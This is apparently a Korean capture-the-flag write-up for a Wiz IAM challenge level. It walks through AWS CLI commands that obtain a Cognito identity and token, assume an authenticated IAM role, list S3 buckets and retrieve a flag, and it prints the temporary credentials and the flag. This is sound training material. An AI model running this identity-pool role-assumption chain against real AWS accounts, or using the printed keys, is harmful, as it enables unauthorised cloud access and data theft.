# Q.

Anonymous access no more. Let's see what can you do now.

Now try it with the authenticated role: arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

# A.

```
// 1. 위에 조건에 있는 값(IdentityPool)으로 IdentityId 획득
> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:157d6171-ee8c-c5fd-fb06-e47483ae7095"
}

// 2. OpenIdToken 획득
> aws cognito-identity get-open-id-token --identity-id us-east-1:157d6171-ee8c-c5fd-fb06-e47483ae7095
{
    "IdentityId": "us-east-1:157d6171-ee8c-c5fd-fb06-e47483ae7095",
    "Token": "eyJraWQiOiJ1cy1lYXN0LTE..."
}

// 3. Cognito 인증을 통해 Cognito_s3accessAuth_Role 해당 역할 위임
> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --web-identity-token eyJraWQiOiJ1cy1lYXN0LTE...
{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXJBYF7VUM",
        "SecretAccessKey": "hheXjK1boniSfT4u3Bj6cnDHwTUiOc6Kacv0J12T",
        "SessionToken": "FwoGZXIvYXdzEBgaDPsGrxaL4i...",
        "Expiration": "2024-11-10T15:39:09Z"
    },
    "SubjectFromWebIdentityToken": "us-east-1:157d6171-ee8c-c5fd-fb06-e47483ae7095",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:example_session_name",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/example_session_name"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}

// 4. 위임한 역할 확인
> aws sts get-caller-identity
{
    "UserId": "AROARK7LBOHXASFTNOIZG:example_session_name",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/example_session_name"
}

// 5. 버킷 확인
> aws s3 ls
2024-06-06 15:21:35 challenge-website-storage-1fa5073
2024-06-06 17:25:59 payments-system-cd6e4ba
2023-06-05 02:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 22:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-05 01:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 22:28:31 wiz-privatefiles
2023-06-05 22:28:31 wiz-privatefiles-x1000

// 6. 플래그값 획득
> aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -
{wiz:open-sesame-or-shell-i-say-openid}
```

# 풀이 설명

- 앞에서 많이 헤맸어서 이번 문제도 어려울거라고 생각했는데 cognito를 통해 인증하는 흐름을 알고있다면 쉽게 가능한 문제였다. 최근에 경험해본게 도움이 많이 되었다.

출처: [Cognito 공식문서](https://docs.aws.amazon.com/ko_kr/cognito/latest/developerguide/authentication-flow.html)
![auth-flow](./solution6-img-1.png)
